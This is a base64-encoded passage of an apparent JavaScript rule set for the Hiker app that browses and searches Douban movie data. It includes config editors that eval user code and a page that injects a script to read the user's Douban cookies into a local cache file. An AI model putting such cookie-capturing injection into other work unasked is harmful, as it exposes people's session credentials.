CAgICAgICB9KVxcXFxuICAgIH1cXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ+S/neWtmCcsXFxcXG4gICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxcXG4gICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGNvbmZpZ0tleSwgcGFyYW1zKSA9PiB7XFxcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShyZXF1ZXN0KGdldE15VmFyKCdxZGJfY29uZmlnJykpKVxcXFxuICAgICAgICAgICAgbGV0IG5hbWUgPSBnZXRNeVZhcihwYXJhbXMua2V5LCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGlmKG5hbWUgPT0gJ+m7mOiupCcpIHJldHVybiAndG9hc3Q6Ly/pu5jorqTphY3nva7ml6Dms5XnvJbovpEnXFxcXG4gICAgICAgICAgICBjb25maWdbY29uZmlnS2V5XS51c2UgPSBuYW1lXFxcXG4gICAgICAgICAgICBpZiAoIWNvbmZpZ1tjb25maWdLZXldW25hbWVdKSBjb25maWdbY29uZmlnS2V5XVtuYW1lXSA9IHt9XFxcXG4gICAgICAgICAgICBsZXQgZGF0YXMgPSBwYXJhbXMuZGF0YTtcXFxcbiAgICAgICAgICAgIGxldCBkYXRhS2V5cyA9IE9iamVjdC5rZXlzKGRhdGFzKTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgaW4gZGF0YUtleXMpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgZGF0YUtleSA9IGRhdGFLZXlzW2ldXFxcXG4gICAgICAgICAgICAgICAgbGV0IGRhdGEgPSBkYXRhc1tkYXRhS2V5XVxcXFxuICAgICAgICAgICAgICAgIGNvbmZpZ1tjb25maWdLZXldW25hbWVdW2RhdGFLZXldID0gZ2V0TXlWYXIoZGF0YS5rZXksIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgd3JpdGVGaWxlKGdldE15VmFyKCdxZGJfY29uZmlnJyksIEpTT04uc3RyaW5naWZ5KGNvbmZpZykpXFxcXG4gICAgICAgICAgICBiYWNrKCk7XFxcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5L+d5a2Y5oiQ5YqfJ1xcXFxuICAgICAgICB9LCBjb25maWdLZXksIHBhcmFtcylcXFxcbiAgICB9KVxcXFxufVxcXFxuXFxcXG4vL+iHquWumuS5iemmlumhtS3phY3nva7nvJbovpHpobXpnaJcXFxcbmZ1bmN0aW9uIGhvbWVQYWdlTW9kZUVkaXRQYWdlKGQpIHtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJzxmb250IGNvbG9yPVxcXFxcXFwicmVkXFxcXFxcXCI+JyArICfov5Tlm57mlbDnu4Qs5L6bc2V0UmVzdWx05L2/55SoJyArICc8L2ZvbnQ+JyArICc8Zm9udCBjb2xvcj1cXFxcXFxcIiM4MDgwODBcXFxcXFxcIj48YnI+JyArICfjgJDlhoXnva7lh73mlbDjgJEnICsgJzxicj4mbmJzcDsmbmJzcDsmbmJzcDtoaWtlcjovL3BhZ2Uvc2V0dGluZ1BhZ2U6IOiuvue9rumhtSjpu5jorqTpppbpobXmnInkvb/nlKjnpLrkvospJyArICc8L2ZvbnQ+JyxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxcXG4gICAgfSlcXFxcbiAgICBtb2RlRWRpdFBhZ2UoZCwgXFxcXFxcXCJob21lUGFnZUNvbmZpZ3NcXFxcXFxcIiwge1xcXFxuICAgICAgICBrZXk6IFxcXFxcXFwiaW5wdXRfbmFtZVxcXFxcXFwiLFxcXFxuICAgICAgICBkZXNjOiBcXFxcXFxcIuivt+i+k+WFpeWQjeensFxcXFxcXFwiLFxcXFxuICAgICAgICAvLyB0eXBlOiAnaW5wdXQnXFxcXG4gICAgICAgIGRhdGE6IHtcXFxcbiAgICAgICAgICAgIGNvbmZpZzoge1xcXFxuICAgICAgICAgICAgICAgIGtleTogXFxcXFxcXCJpbnB1dF9jb2RlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLor7fovpPlhaXphY3nva7ku6PnoIFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB0eXBlOiAndGV4dGFyZWEnXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICB9KVxcXFxufVxcXFxuXFxcXG4vL+iHquWumuS5ieivpuaDhemhtemdoi3phY3nva7nvJbovpHpobXpnaJcXFxcbmZ1bmN0aW9uIGRldGFpbFZpZXdNb2RlRWRpdFBhZ2UoZCkge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAnPGZvbnQgY29sb3I9XFxcXFxcXCIjODA4MDgwXFxcXFxcXCI+JyArICfjgJDlhoXnva7lj5jph4/jgJEnICsgJzxicj4mbmJzcDsmbmJzcDsmbmJzcDtpZDog54mH5Y2VaWQnICsgJzxicj4mbmJzcDsmbmJzcDsmbmJzcDt0eXBlOiDniYfljZXnsbvlnosnICsgJzxicj4mbmJzcDsmbmJzcDsmbmJzcDt0aXRsZTog54mH5Y2V5qCH6aKYJyArICc8L2ZvbnQ+JyxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxcXG4gICAgfSlcXFxcbiAgICBtb2RlRWRpdFBhZ2UoZCwgXFxcXFxcXCJkZXRhaWxzVmlld0NvbmZpZ3NcXFxcXFxcIiwge1xcXFxuICAgICAgICBrZXk6IFxcXFxcXFwiaW5wdXRfbmFtZVxcXFxcXFwiLFxcXFxuICAgICAgICBkZXNjOiBcXFxcXFxcIuivt+i+k+WFpeWQjeensFxcXFxcXFwiLFxcXFxuICAgICAgICAvLyB0eXBlOiAnaW5wdXQnXFxcXG4gICAgICAgIGRhdGE6IHtcXFxcbiAgICAgICAgICAgIGNvbmZpZzoge1xcXFxuICAgICAgICAgICAgICAgIGtleTogXFxcXFxcXCJpbnB1dF9jb2RlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLor7fovpPlhaXphY3nva7ku6PnoIFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB0eXBlOiAndGV4dGFyZWEnXFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgc2V0dGluZzoge1xcXFxuICAgICAgICAgICAgICAgIGtleTogXFxcXFxcXCJpbnB1dF9zZXR0aW5nX2NvZGVcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBcXFxcXFxcIuivt+i+k+WFpeiuvue9rumhtemdouS7o+eggVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHR5cGU6ICd0ZXh0YXJlYSdcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgIH0pXFxcXG59XFxcXG5cXFxcbi8v6Ieq5a6a5LmJ6Kej5p6QLee8lui+kemhtemdolxcXFxuZnVuY3Rpb24gYW5hbHlzaXNNb2RlRWRpdFBhZ2UoZCkge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAnPGZvbnQgY29sb3I9XFxcXFxcXCIjODA4MDgwXFxcXFxcXCI+JyArICfjgJDop6PmnpDku6PnoIHlhoXnva7lj5jph4/jgJEnICsgJzxicj4mbmJzcDsmbmJzcDsmbmJzcDtpbnB1dDog6KeG6aKR6ZO+5o6lJyArICc8L2ZvbnQ+JyxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxcXG4gICAgfSlcXFxcbiAgICBtb2RlRWRpdFBhZ2UoZCwgXFxcXFxcXCJhbmFseXNpc0NvbmZpZ3NcXFxcXFxcIiwge1xcXFxuICAgICAgICBrZXk6IFxcXFxcXFwiaW5wdXRfbmFtZVxcXFxcXFwiLFxcXFxuICAgICAgICBkZXNjOiBcXFxcXFxcIuivt+i+k+WFpeWQjeensFxcXFxcXFwiLFxcXFxuICAgICAgICAvLyB0eXBlOiAnaW5wdXQnXFxcXG4gICAgICAgIGRhdGE6IHtcXFxcbiAgICAgICAgICAgIGNvbmZpZzoge1xcXFxuICAgICAgICAgICAgICAgIGtleTogXFxcXFxcXCJpbnB1dF9jb2RlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLor7fovpPlhaXop6PmnpDku6PnoIFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB0eXBlOiAndGV4dGFyZWEnXFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBrZXk6ICdpbnB1dF9leHRyYScsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogJ+ivt+i+k+WFpWV4dHJh5bGe5oCn5YC8JyxcXFxcbiAgICAgICAgICAgICAgICB0eXBlOiAndGV4dGFyZWEnXFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgc2V0dGluZzoge1xcXFxuICAgICAgICAgICAgICAgIGtleTogXFxcXFxcXCJpbnB1dF9zZXR0aW5nX2NvZGVcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBcXFxcXFxcIuivt+i+k+WFpeiuvue9rumhtemdouS7o+eggVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHR5cGU6ICd0ZXh0YXJlYSdcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgIH0pXFxcXG59XFxcXG5cXFxcbmxldCBkID0gW107XFxcXG5sZXQgdmlldyA9IGdldFBhcmFtKFxcXFxcXFwidmlld1xcXFxcXFwiLFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuaWYodmlldz09XFxcXFxcXCJhbmFseXNpc01vZGVFZGl0UGFnZVxcXFxcXFwiKXtcXFxcbiAgICBzZXRQYWdlVGl0bGUoXFxcXFxcXCLoh6rlrprkuYnop6PmnpDnvJbovpFcXFxcXFxcIilcXFxcbiAgICBhbmFseXNpc01vZGVFZGl0UGFnZShkKTtcXFxcbn1lbHNlIGlmKHZpZXc9PVxcXFxcXFwiZGV0YWlsVmlld01vZGVFZGl0UGFnZVxcXFxcXFwiKXtcXFxcbiAgICBzZXRQYWdlVGl0bGUoXFxcXFxcXCLoh6rlrprkuYnor6bmg4XpobXnvJbovpFcXFxcXFxcIilcXFxcbiAgICBkZXRhaWxWaWV3TW9kZUVkaXRQYWdlKGQpO1xcXFxufWVsc2UgaWYodmlldz09XFxcXFxcXCJob21lUGFnZU1vZGVFZGl0UGFnZVxcXFxcXFwiKXtcXFxcbiAgICBzZXRQYWdlVGl0bGUoXFxcXFxcXCLoh6rlrprkuYnpppbpobXnvJbovpFcXFxcXFxcIilcXFxcbiAgICBob21lUGFnZU1vZGVFZGl0UGFnZShkKTtcXFxcbn1cXFxcbnNldFJlc3VsdChkKTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLop6PpmaTooqvlsIFpcFxcXCIsXFxcInBhdGhcXFwiOlxcXCJyZWxlYXNlSVBcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5sZXQgaWQgPSBnZXRQYXJhbSgnaWQnKTtcXFxcbmxldCBkID0gW107XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiAn5oKo5bey6KKr5bCB56aBSVDlnLDlnYDmiJbop6blj5HkuobkurrmnLrpqozor4HvvIzor7fmjInnhafku6XkuIvmraXpqqTlpITnkIYo5aaC5LiN5aSE55CG5oKo5bCG5Zyo5LiA5q615pe26Ze05YaF5peg5rOV5q2j5bi46I635Y+W5Ymn6ZuG5YiX6KGoKScsXFxcXG4gICAgdXJsOiAnaGlrZXI6Ly9lbXB0eScsXFxcXG4gICAgY29sX3R5cGU6ICd0ZXh0XzEnXFxcXG59KTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6ICcxLueCueWHu+atpOWkhOWvvOWFpeiHquWKqOiOt+WPlkNvb2tpZeaPkuS7ticsXFxcXG4gICAgdXJsOiAkKClcXFxcbiAgICAgICAgLmxhenlSdWxlKCgpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBnZXREb3ViYW5Db29raWUgPSBcXFxcXFxcIihmdW5jdGlvbigpe2lmKHdpbmRvd1snbG9jYXRpb24nXVsnaG9zdCddPT0nd3d3LmRvdWJhbi5jb20nKXtmeV9icmlkZ2VfYXBwWyd3cml0ZUZpbGUnXSgnaGlrZXI6Ly9maWxlcy9jYWNoZS9kb3ViYW5jb29raWUudHh0JyxmeV9icmlkZ2VfYXBwWydnZXRDb29raWUnXSgnaHR0cHM6Ly93d3cuZG91YmFuLmNvbS8nKSk7fWlmKHdpbmRvd1snbG9jYXRpb24nXVsnaG9zdCddPT0nbS5kb3ViYW4uY29tJyl7ZnlfYnJpZGdlX2FwcFsnd3JpdGVGaWxlJ10oJ2hpa2VyOi8vZmlsZXMvY2FjaGUvZG91YmFuY29va2llLnR4dCcsZnlfYnJpZGdlX2FwcFsnZ2V0Q29va2llJ10oJ2h0dHBzOi8vbS5kb3ViYW4uY29tLycpKTt9fSgpKTtcXFxcXFxcIlxcXFxuICAgICAgICAgICAgaWYgKCFmaWxlRXhpc3QoJ2hpa2VyOi8vZmlsZXMvY2FjaGUvZ2xvYmFsX2dldERvdWJhbkNvb2tpZS5qcycpKSB7XFxcXG4gICAgICAgICAgICAgICAgd3JpdGVGaWxlKCdoaWtlcjovL2ZpbGVzL2NhY2hlL2dsb2JhbF9nZXREb3ViYW5Db29raWUuanMnLCBnZXREb3ViYW5Db29raWUpO1xcXFxuICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgICAgIHJldHVybiAncnVsZTovLycgKyBiYXNlNjRFbmNvZGUoJ+a1t+mYlOinhueVjO+8jOe9kemhteaPkuS7tu+/pWpzX3VybO+/pWdsb2JhbF9nZXREb3ViYW5Db29raWVAaGlrZXI6Ly9maWxlcy9jYWNoZS9nbG9iYWxfZ2V0RG91YmFuQ29va2llLmpzJyk7XFxcXG4gICAgICAgIH0pLFxcXFxuICAgIGNvbF90eXBlOiAndGV4dF8xJ1xcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiAnMi7ngrnlh7vmraTlpITov5vlhaXnvZHpobXov5vooYznmbvlvZXmiJbkurrmnLrpqozor4HvvIzlrozmiJDlkI7ov5Tlm57mraTpobXpnaInLFxcXFxuICAgIHVybDogJ2h0dHBzOi8vbW92aWUuZG91YmFuLmNvbS9zdWJqZWN0LycgKyBpZCArICcvJyxcXFxcbiAgICBjb2xfdHlwZTogJ3RleHRfMSdcXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogJzMu5a6M5oiQ55m75b2V5oiW5Lq65py66aqM6K+B5ZCO6L+U5Zue5b2x54mH6K+m5oOF6aG16Z2i6YeN5paw6L+b5YWlJyxcXFxcbiAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXFxcbiAgICBjb2xfdHlwZTogJ3RleHRfMSdcXFxcbn0pO1xcXFxuc2V0UmVzdWx0KGQpXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5oqi5pWR6aG16Z2iXFxcIixcXFwicGF0aFxcXCI6XFxcInVyZ2VuY3lNb2RlXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxubGV0IGQgPSBbXTtcXFxcblxcXFxuZC5wdXNoKHtcXFxcbiAgdGl0bGU6ICflvojmmI7mmL4s5Ye65LqG5LiA5Lqb5bCP6Zeu6aKYLOW7uuiuruafpeeci+iuvue9ricsXFxcXG4gIGRlc2M6IFxcXFxcXFwi5Ye66ZSZ5L2N572uOlxcXFxcXFwiICsgKHR5cGVvZihwb3MpID09ICd1bmRlZmluZWQnID8gJ+acquefpScgOiBwb3MpLFxcXFxuICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcXFxuICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXFxcbn0pO1xcXFxuXFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiAn54K55oiR6L+b5YWl6K6+572u6aG1JyxcXFxcbiAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxcXG4gICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9zZXR0aW5nUGFnZVxcXFxcXFwiXFxcXG59KVxcXFxuXFxcXG5kLnB1c2goe1xcXFxuICB0aXRsZTogJ+iLpeS/ruaUueiuvue9ruS4jei1t+S9nOeUqCzngrnmiJHlpI3liLbplJnor6/kv6Hmga/mj5DkuqTnu5nlvIDlj5HogIUnLFxcXFxuICBkZXNjOiBlLnRvU3RyaW5nKCksXFxcXG4gIGNvbF90eXBlOiAndGV4dF8xJyxcXFxcbiAgdXJsOiAnY29weTovLycgKyBlLnRvU3RyaW5nKCksXFxcXG59KTtcXFxcblxcXFxuc2V0UmVzdWx0KGQpO1xcXFxuXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6aG65L2s5LiT55So6K+m5oOF6aG1XFxcIixcXFwicGF0aFxcXCI6XFxcIlNkZXRhaWxcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5ldmFsKE1ZX1JVTEUucHJlUnVsZSk7XFxcXG5ldmFsKEpTT04ucGFyc2UocmVxdWVzdChcXFxcXFxcImhpa2VyOi8vcGFnZS9tYWluXFxcXFxcXCIpKS5ydWxlKTtcXFxcbmxldCB0eXBlID0gZ2V0UGFyYW0oJ3R5cGUnLCAnJyksXFxcXG4gICAgaWQgPSBnZXRQYXJhbSgnaWQnLCAnJyk7XFxcXG5kZXRhaWxzVmlldyh0eXBlLCBpZCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5Li75Luj56CBXFxcIixcXFwicGF0aFxcXCI6XFxcIm1haW5cXFwiLFxcXCJydWxlXFxcIjpcXFwibGV0IHZlcnNpb24gPSAyMDI0MDIxNzAwMDE7XFxcXHJcXFxcbmV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvdXRpbHMnKSkucnVsZSk7XFxcXHJcXFxcblxcXFxyXFxcXG5sZXQgcGFyc2VWaWRlb1VybExhenkgPSAkLnRvU3RyaW5nKCgpID0+IHtcXFxcclxcXFxuICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgIGxldCBhbmFseXNpc0NvbmZpZ3MgPSBnZXRDb25maWcoJ2FuYWx5c2lzQ29uZmlncycpO1xcXFxyXFxcXG4gICAgbGV0IGFuYWx5c2lzQ29uZmlnID0gYW5hbHlzaXNDb25maWdzW2FuYWx5c2lzQ29uZmlncy51c2VdLmNvbmZpZztcXFxcclxcXFxuICAgIGxldCByZXN1bHQgPSBcXFxcXFxcInRvYXN0Oi8v6Kej5p6Q5aSx6LSlXFxcXFxcXCI7XFxcXHJcXFxcbiAgICB0cnkge1xcXFxyXFxcXG4gICAgICAgIGlmIChhbmFseXNpc0NvbmZpZy5zdGFydHNXaXRoKFxcXFxcXFwiKFxcXFxcXFwiKSkge1xcXFxyXFxcXG4gICAgICAgICAgICBldmFsKCdyZXN1bHQgPSAnICsgYW5hbHlzaXNDb25maWcpO1xcXFxyXFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGV2YWwoJ3Jlc3VsdCA9ICcgKyAnKCgpID0+IHsnICsgYW5hbHlzaXNDb25maWcgKyAnfSkoKScpO1xcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH0gY2F0Y2ggKGUpIHt9XFxcXHJcXFxcbiAgICByZXR1cm4gcmVzdWx0O1xcXFxyXFxcXG59KVxcXFxyXFxcXG5cXFxcclxcXFxuLy/pppbpobVcXFxcclxcXFxuZnVuY3Rpb24gaG9tZSgpIHtcXFxcclxcXFxuICAgIGlmIChnZXRJdGVtKFxcXFxcXFwic3RhcnRcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikgPT0gXFxcXFxcXCJcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgIHNldEl0ZW0oXFxcXFxcXCJzdGFydFxcXFxcXFwiLCBcXFxcXFxcIjFcXFxcXFxcIik7XFxcXHJcXFxcbiAgICAgICAgc2V0SXRlbSgndXBkYXRlJywgU3RyaW5nKHZlcnNpb24pKTtcXFxcclxcXFxuICAgICAgICBjb25maXJtKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6ICfmuKnppqjmj5DnpLonLFxcXFxyXFxcXG4gICAgICAgICAgICBjb250ZW50OiAn5q2k6KeE5YiZ5LuF6ZmQ5a2m5Lmg5Lqk5rWB5L2/55SoXFxcXFxcXFxu6K+35LqO5a+85YWl5ZCOMjTlsI/ml7blhoXliKDpmaQhXFxcXFxcXFxuXFxcXFxcXFxu5Lu75L2V57uE57uH5oiW5Liq5Lq65LiN5b6X5Lul5Lu75L2V5pa55byP5pa55rOVXFxcXFxcXFxu5Lyg5pKt5q2k6KeE5YiZ55qE5pW05L2T5oiW6YOo5YiGISFcXFxcXFxcXG5cXFxcXFxcXG7mhJ/osKLlpKfkvazku6zmj5DkvpvnmoTmioDmnK/mlK/mjIEhISEnLFxcXFxyXFxcXG4gICAgICAgICAgICBjb25maXJtOiAnJyxcXFxcclxcXFxuICAgICAgICAgICAgY2FuY2VsOiAnJ1xcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgIGxldCB1cGRhdGVJbmZvID0gZ2V0SXRlbSgndXBkYXRlJywgJycpO1xcXFxyXFxcXG4gICAgICAgIGlmICh1cGRhdGVJbmZvID09ICcnIHx8IHBhcnNlSW50KHVwZGF0ZUluZm8pIDwgdmVyc2lvbikge1xcXFxyXFxcXG4gICAgICAgICAgICBzZXRJdGVtKCd1cGRhdGUnLCBTdHJpbmcodmVyc2lvbikpO1xcXFxyXFxcXG4gICAgICAgICAgICBjb25maXJtKHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiAn5pys5qyh5pu05paw5YaF5a65JyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbnRlbnQ6ICfpmY3kvY7phY3nva7mlofku7blh7rplJnmpoLnjocnLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29uZmlybTogJycsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBjYW5jZWw6ICcnXFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcXFxyXFxcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJxZGJfY29uZmlnXFxcXFxcXCIpO1xcXFxyXFxcXG4gICAgfSkpXFxcXHJcXFxcbiAgICBsZXQgaG9tZVBhZ2VDb25maWdzID0gZ2V0Q29uZmlnKCdob21lUGFnZUNvbmZpZ3MnKTtcXFxcclxcXFxuICAgIGxldCBob21lUGFnZUNvbmZpZyA9IGhvbWVQYWdlQ29uZmlnc1tob21lUGFnZUNvbmZpZ3MudXNlXS5jb25maWc7XFxcXHJcXFxcbiAgICBpZiAoaG9tZVBhZ2VDb25maWcuc3RhcnRzV2l0aChcXFxcXFxcIihcXFxcXFxcIikpIHtcXFxcclxcXFxuICAgICAgICBldmFsKCdkID0gJyArIGhvbWVQYWdlQ29uZmlnKVxcXFxyXFxcXG4gICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICBldmFsKCdkID0gJyArICcoKCkgPT4geycgKyBob21lUGFnZUNvbmZpZyArICd9KSgpJylcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIHNldFJlc3VsdChkKTtcXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/mtbfpmJTmkJzntKJcXFxcclxcXFxuZnVuY3Rpb24gc2VhcmNoKCkge1xcXFxyXFxcXG4gICAgbGV0IHdkID0gTVlfVVJMLnNwbGl0KFxcXFxcXFwiLyMvXFxcXFxcXCIpWzFdO1xcXFxyXFxcXG4gICAgbGV0IHBhZ2UgPSBNWV9QQUdFO1xcXFxyXFxcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoJ2h0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvc2VhcmNoL3N1YmplY3RzP3R5cGU9bW92aWUmcT0nICsgd2QgKyAocGFnZSA/ICcmc3RhcnQ9JyArIChwYWdlIC0gMSkgKiAyMCA6ICcmc3RhcnQ9MCcpICsgJyZjb3VudD0yMCcpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBsaXN0ID0gcy5pdGVtcztcXFxcclxcXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBpdGVtcyA9IFtdO1xcXFxyXFxcXG4gICAgbGlzdC5mb3JFYWNoKGRhdGEgPT4ge1xcXFxyXFxcXG4gICAgICAgIGlmIChkYXRhLnRhcmdldF90eXBlID09ICdkb3VsaXN0X2NhcmRzJykge1xcXFxyXFxcXG4gICAgICAgICAgICBkYXRhLnRhcmdldC5kb3VsaXN0cy5mb3JFYWNoKGUgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGUudGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyRwYWdle2Z5cGFnZX0jbm9IaXN0b3J5IycpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIC5ydWxlKCh0eXBlLCBpZCkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvdUxpc3QoaWQsIE1ZX1BBR0UsIDUwKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodHlwZSA9PSBcXFxcXFxcImNvbGxlY3Rpb25cXFxcXFxcIiB8fCB0eXBlID09IFxcXFxcXFwiY2hhcnRcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1YmplY3RDb2xsZWN0aW9uTGlzdChNWV9QQUdFLCA1MCwgaWQpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9LCBlLnRhcmdldF90eXBlLCBlLmlkKSxcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBpbWc6IGUuY292ZXJfdXJsICsgXFxcXFxcXCJAUmVmZXJlcj1cXFxcXFxcIiArIGUuY292ZXJfdXJsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgIH0gZWxzZSBpZiAoZGF0YS50YXJnZXRfdHlwZSA9PSAnY2hhcnQnKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCBlID0gZGF0YS50YXJnZXQ7XFxcXHJcXFxcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGUudGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJylcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAucnVsZSgodHlwZSwgaWQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodHlwZSA9PSBcXFxcXFxcImNvb